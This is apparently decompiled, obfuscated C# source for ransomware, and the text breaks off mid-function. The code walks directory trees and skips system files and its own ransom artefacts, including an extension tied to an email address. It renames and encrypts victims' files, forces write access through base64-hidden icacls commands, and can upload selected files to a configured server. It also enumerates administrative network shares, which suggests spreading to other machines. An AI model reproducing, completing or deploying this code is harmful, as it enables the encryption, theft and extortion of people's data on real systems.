using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using TtEFsifoIogH;

namespace WvdSzXINIqX;

internal sealed class JenwHsdeeXa
{
	public sealed class SiqkJpwgYTfD
	{
		private static StringCollection kJnKYUXOByxbFc = new StringCollection();

		private static List<string> cRgiBIXYwG = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(XKJIixIieoUFn("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".[Tiberiano@aol.com].getin") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(GkzMChUYOUNM))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(dpqRUXsALKm) * 1024.0 * 1024.0 && GcmmzKkiyaeM == "YES")
							{
								cRgiBIXYwG.Add(text);
							}
							else if (File.Exists(text) && GcmmzKkiyaeM == "NO")
							{
								cRgiBIXYwG.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return cRgiBIXYwG;
		}
	}

	private sealed class ppPyBrDmgRzq
	{
		public string IbsZtgovtBL;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == IbsZtgovtBL;
		}
	}

	private sealed class vugnkECkUbG
	{
		public string otfYEvvRNGn;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(PAsRAwMADTR);
			nlODfRjnVhuyHV.Add("\\\\" + otfYEvvRNGn + "\\" + (char)int_0 + "$");
			try
			{
				if (mGPgYiqNVpxAeD)
				{
					Console.WriteLine("\\\\" + otfYEvvRNGn + "\\" + (char)int_0 + "$");
				}
			}
			catch
			{
			}
		}
	}

	private sealed class IzBeUjxikrftX
	{
		private sealed class FELNnuhKENJh
		{
			public IzBeUjxikrftX TvMwqKguod;

			public string hwBFQyFIuyQyBwP;

			public void _003CCrypt_003Eb__25()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					OgqjasYecM(WindowsIdentity.GetCurrent().Name, hwBFQyFIuyQyBwP);
				}
			}

			public void _003CCrypt_003Eb__26()
			{
				qGZfsRSgDcvhqd(hwBFQyFIuyQyBwP, TvMwqKguod.VKaFkoznxbVT, TvMwqKguod.UlDUtrXojIVQov, TvMwqKguod.ZzuoScIuyjsQSwe, TvMwqKguod.TgmCNzELmTPb);
			}
		}

		public string[] VKaFkoznxbVT;

		public string[] ZzuoScIuyjsQSwe;

		public string TgmCNzELmTPb;

		public string UlDUtrXojIVQov;

		public void _003CCrypt_003Eb__24(string string_0)
		{
			FELNnuhKENJh CS_0024_003C_003E8__locals0 = new FELNnuhKENJh();
			CS_0024_003C_003E8__locals0.TvMwqKguod = this;
			CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP = string_0;
			if (DkGKAkKksBrre && !gotnrzqTwtuXaGE().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						OgqjasYecM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (jOXeuDmfknLZmaw == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					qGZfsRSgDcvhqd(CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP, CS_0024_003C_003E8__locals0.TvMwqKguod.VKaFkoznxbVT, CS_0024_003C_003E8__locals0.TvMwqKguod.UlDUtrXojIVQov, CS_0024_003C_003E8__locals0.TvMwqKguod.ZzuoScIuyjsQSwe, CS_0024_003C_003E8__locals0.TvMwqKguod.TgmCNzELmTPb);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				qGZfsRSgDcvhqd(CS_0024_003C_003E8__locals0.hwBFQyFIuyQyBwP, VKaFkoznxbVT, UlDUtrXojIVQov, ZzuoScIuyjsQSwe, TgmCNzELmTPb);
			}
		}
	}

	private sealed class SMHQoYVqmFryqDhh
	{
		private sealed class EbGXJwZiQHXBRf
		{
			public SMHQoYVqmFryqDhh pDcPGayaeXCih;

			public string XrrXEzmNAnfLzJ;

			public void _003CWorkerCrypter2_003Eb__34()
			{
				try
				{
					if (mGPgYiqNVpxAeD)
					{
						Console.WriteLine("File in process: " + XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(XrrXEzmNAnfLzJ).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
						Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}
		}

		private sealed class vMYjbqTIpVNnVt
		{
			public EbGXJwZiQHXBRf xOPGAPzknzyn;

			public SMHQoYVqmFryqDhh pDcPGayaeXCih;

			public string FfsvRAsxIMv;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in QEQDItjwRt)
				{
					if (FfsvRAsxIMv.ToLower().EndsWith(item + pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
					{
						if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(FfsvRAsxIMv).Length)
						{
							try
							{
								CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", FfsvRAsxIMv);
							}
							catch
							{
							}
						}
					}
					else if (FfsvRAsxIMv.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
					{
						try
						{
							CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", FfsvRAsxIMv);
						}
						catch
						{
						}
					}
				}
			}
		}

		private sealed class cxwDuacTAsYRPIQ
		{
			public SMHQoYVqmFryqDhh pDcPGayaeXCih;

			public string XrrXEzmNAnfLzJ;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				try
				{
					if (mGPgYiqNVpxAeD)
					{
						Console.WriteLine("File in process: " + XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(XrrXEzmNAnfLzJ).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
						Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__38()
			{
				foreach (string item in QEQDItjwRt)
				{
					if (XrrXEzmNAnfLzJ.ToLower().EndsWith(item + pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
					{
						if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(XrrXEzmNAnfLzJ).Length)
						{
							try
							{
								CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", XrrXEzmNAnfLzJ);
							}
							catch
							{
							}
						}
					}
					else if (XrrXEzmNAnfLzJ.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
					{
						try
						{
							CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", XrrXEzmNAnfLzJ);
						}
						catch
						{
						}
					}
				}
			}
		}

		public List<string> warwRcNDKeG;

		public List<string> izdizlukjze;

		public string iaaUPMfAbF;

		public string[] YUQScPcHxLQi;

		public string FDEMDnoDkQOCHM;

		public void _003CWorkerCrypter2_003Eb__33(string string_0)
		{
			using List<string>.Enumerator enumerator = izdizlukjze.GetEnumerator();
			vMYjbqTIpVNnVt CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				EbGXJwZiQHXBRf CS_0024_003C_003E8__locals1 = new EbGXJwZiQHXBRf();
				CS_0024_003C_003E8__locals1.pDcPGayaeXCih = this;
				CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ = enumerator.Current;
				if (YUQScPcHxLQi.Length != 0)
				{
					string[] yUQScPcHxLQi = YUQScPcHxLQi;
					int num = 0;
					while (num < yUQScPcHxLQi.Length)
					{
						string value = yUQScPcHxLQi[num];
						if (!CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09f3;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(iaaUPMfAbF))
					{
						goto IL_09f3;
					}
				}
				catch (Exception)
				{
					goto IL_09f3;
				}
				if (!CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ.EndsWith(string_0) || fuxMXSqYBU.Contains(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ))
				{
					continue;
				}
				if (BzdPLbixsX == "YES")
				{
					try
					{
						if (wAKzbuUMHhlqNq.XGtUxyNCbAzVs(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ))
						{
							wAKzbuUMHhlqNq.KBXgqJPVcgBbLe(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
						}
					}
					catch
					{
					}
				}
				fuxMXSqYBU.Add(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (mGPgYiqNVpxAeD)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
							Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!HBwkcxyqvEtVP.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ)))
				{
					HBwkcxyqvEtVP.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ));
				}
				ETxqPZpYmRRS(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
				try
				{
					new TAmFrgCEjOqs().RIyyQUdfJyufLOiQ(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (mGPgYiqNVpxAeD)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						kpitRsUfUPt(XKJIixIieoUFn("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + "\"" + XKJIixIieoUFn("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + XKJIixIieoUFn("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (HRuXHUgomikt)
					{
						try
						{
							File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (HRuXHUgomikt)
						{
							try
							{
								File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						WEeJdcZxxnxI++;
						goto end_IL_02e2;
					}
					if (MsXKPMolFXtq == "YES" && new FileInfo(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ).Length > Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024 && !warwRcNDKeG.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new vMYjbqTIpVNnVt();
						CS_0024_003C_003E8__locals0.xOPGAPzknzyn = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.pDcPGayaeXCih = this;
						try
						{
							if (iaaUPMfAbF != ".*")
							{
								if (YxnJxsROHGpBEI)
								{
									iaaUPMfAbF = sPVXhXLBBzIUR + iaaUPMfAbF;
								}
								File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF);
							}
						}
						catch (Exception ex6)
						{
							if (HRuXHUgomikt)
							{
								try
								{
									File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							WEeJdcZxxnxI++;
							goto end_IL_02e2;
						}
						CS_0024_003C_003E8__locals0.FfsvRAsxIMv = "";
						if (iaaUPMfAbF != ".*")
						{
							CS_0024_003C_003E8__locals0.FfsvRAsxIMv = CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF;
						}
						else
						{
							CS_0024_003C_003E8__locals0.FfsvRAsxIMv = CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ;
						}
						if (EpcuvjLUVs == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in QEQDItjwRt)
								{
									if (CS_0024_003C_003E8__locals0.FfsvRAsxIMv.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
									{
										if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.FfsvRAsxIMv).Length)
										{
											try
											{
												CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FfsvRAsxIMv);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.FfsvRAsxIMv.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
									{
										try
										{
											CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.FfsvRAsxIMv);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
						string s = SkKwndcWHaj.LJWdNIWcIsNR(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rIDbJCbxXGOM == "NO")
						{
							byte[] array = null;
							byte[] byte_ = WffqVboAdbw.ZsrPQLMwHRSEDPmm(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024);
							if (WffqVboAdbw.vokiIpTrQqjl(sDetFbTBtkhqI: (!WKWPaQWPQqrRRB) ? (xSIJBVFhcrJvfz ? WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (xSIJBVFhcrJvfz ? HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), TgyqupHXQPS: CS_0024_003C_003E8__locals0.FfsvRAsxIMv, JOMSerecoaWty: bytes))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
							}
							catch (Exception)
							{
							}
						}
						else if (!xSIJBVFhcrJvfz)
						{
							if (QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, dlYfCorqiUsc, FDEMDnoDkQOCHM))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.FfsvRAsxIMv, dlYfCorqiUsc, text, bytes))
							{
								goto IL_09f3;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (YxnJxsROHGpBEI)
					{
						iaaUPMfAbF = sPVXhXLBBzIUR + iaaUPMfAbF;
					}
					string text2 = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
					string s2 = SkKwndcWHaj.LJWdNIWcIsNR(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (iaaUPMfAbF != ".*")
					{
						if (!KTdzEFOlwiRwULiD)
						{
							if (!xSIJBVFhcrJvfz)
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, JIAoluZZnYH);
							}
							else
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!xSIJBVFhcrJvfz)
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, JIAoluZZnYH);
								}
								else
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (HRuXHUgomikt)
								{
									try
									{
										File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex11.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								WEeJdcZxxnxI++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
								}
								catch (Exception)
								{
								}
								goto end_IL_02e2;
							}
						}
					}
					else if (!KTdzEFOlwiRwULiD)
					{
						if (!xSIJBVFhcrJvfz)
						{
							fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + ".part", JIAoluZZnYH);
						}
						else
						{
							fZGtMsFkyjz(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + ".part", Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!xSIJBVFhcrJvfz)
							{
								caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, JIAoluZZnYH);
							}
							else
							{
								caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (HRuXHUgomikt)
							{
								try
								{
									File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex14.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							WEeJdcZxxnxI++;
							goto end_IL_02e2;
						}
					}
					if (xSIJBVFhcrJvfz)
					{
						if (iaaUPMfAbF != ".*")
						{
							sOpOdEXhKGvUT(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ + iaaUPMfAbF, bytes2);
						}
						else
						{
							sOpOdEXhKGvUT(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ, bytes2);
						}
					}
					goto IL_09f3;
					end_IL_02e2:;
				}
				catch (Exception)
				{
					goto IL_09f3;
				}
				continue;
				IL_09f3:
				izdizlukjze.Remove(CS_0024_003C_003E8__locals1.XrrXEzmNAnfLzJ);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			cxwDuacTAsYRPIQ CS_0024_003C_003E8__locals0 = new cxwDuacTAsYRPIQ();
			CS_0024_003C_003E8__locals0.pDcPGayaeXCih = this;
			CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ = string_0;
			if (YUQScPcHxLQi.Length != 0)
			{
				string[] yUQScPcHxLQi = YUQScPcHxLQi;
				int num = 0;
				while (num < yUQScPcHxLQi.Length)
				{
					string value = yUQScPcHxLQi[num];
					if (!CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0978;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.EndsWith(iaaUPMfAbF))
				{
					goto IL_0978;
				}
			}
			catch (Exception)
			{
				goto IL_0978;
			}
			if (!fuxMXSqYBU.Contains(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ))
			{
				if (BzdPLbixsX == "YES")
				{
					try
					{
						if (wAKzbuUMHhlqNq.XGtUxyNCbAzVs(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ))
						{
							wAKzbuUMHhlqNq.KBXgqJPVcgBbLe(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
						}
					}
					catch
					{
					}
				}
				fuxMXSqYBU.Add(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (mGPgYiqNVpxAeD)
						{
							Console.WriteLine("File in process: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length + " bytes");
							Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", fuxMXSqYBU.Count, VnshRzSTFwJvI, WEeJdcZxxnxI);
							Console.WriteLine("Time elapsed:  {0}", eulLLquaCJeYr.Elapsed);
							Console.WriteLine("----------------------------------------------------------------------------");
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!HBwkcxyqvEtVP.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ)))
				{
					HBwkcxyqvEtVP.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ));
				}
				ETxqPZpYmRRS(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				try
				{
					new TAmFrgCEjOqs().RIyyQUdfJyufLOiQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (mGPgYiqNVpxAeD)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						kpitRsUfUPt(XKJIixIieoUFn("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + "\"" + XKJIixIieoUFn("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + XKJIixIieoUFn("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (HRuXHUgomikt)
					{
						try
						{
							File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length != 0L)
						{
							goto end_IL_02af;
						}
						goto end_IL_02af_2;
						end_IL_02af:;
					}
					catch (Exception ex4)
					{
						if (HRuXHUgomikt)
						{
							try
							{
								File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						WEeJdcZxxnxI++;
						goto end_IL_02af_2;
					}
					if (MsXKPMolFXtq == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length > Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024)
					{
						try
						{
							if (iaaUPMfAbF != ".*")
							{
								if (YxnJxsROHGpBEI)
								{
									iaaUPMfAbF = sPVXhXLBBzIUR + iaaUPMfAbF;
								}
								File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + iaaUPMfAbF);
							}
						}
						catch (Exception ex6)
						{
							if (HRuXHUgomikt)
							{
								try
								{
									File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							WEeJdcZxxnxI++;
							return;
						}
						if (iaaUPMfAbF != ".*")
						{
							CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ += iaaUPMfAbF;
						}
						if (EpcuvjLUVs == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in QEQDItjwRt)
								{
									if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
									{
										if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length)
										{
											try
											{
												CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
									{
										try
										{
